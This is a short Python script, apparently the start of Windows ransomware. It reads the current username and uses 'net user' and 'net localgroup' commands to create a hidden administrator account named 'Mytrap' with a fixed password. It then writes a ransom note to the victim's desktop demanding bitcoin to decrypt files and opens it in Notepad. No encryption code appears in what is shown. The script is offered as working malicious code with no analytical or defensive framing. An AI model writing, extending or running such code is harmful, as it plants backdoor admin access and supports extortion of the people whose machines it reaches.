#!/usr/bin/env python
#coding:utf-8
import subprocess, sys, os
import subprocess as sub
import ctypes, sys
from hashlib import sha256

victim = os.environ["USERNAME"]
drive = os.environ["SystemDrive"]

def adminUser():

    newUser = "net user Mytrap azerty /add"
    os.system(newUser)

    addGroupAdmin = "net localgroup Administrators Mytrap /add"
    os.system(addGroupAdmin)

def message():

    text = "Hello {}, You have been hacked! Send me 1 bitcoin if you want to decrypt your files!  My bitcoin adress is:  https://www.bitcoin.com/".format(victim)
    path = "{}\\Users\\{}\\Desktop\\{}".format(drive, victim, victim)
    text_path = "echo {} >> {}".format(text, path)
    os.system(text_path)

    path = "{}\\Users\\{}\\Desktop\\{}".format(drive, victim, victim)
    openDoc = "notepad {}".format(path)
    os.system(openDoc)
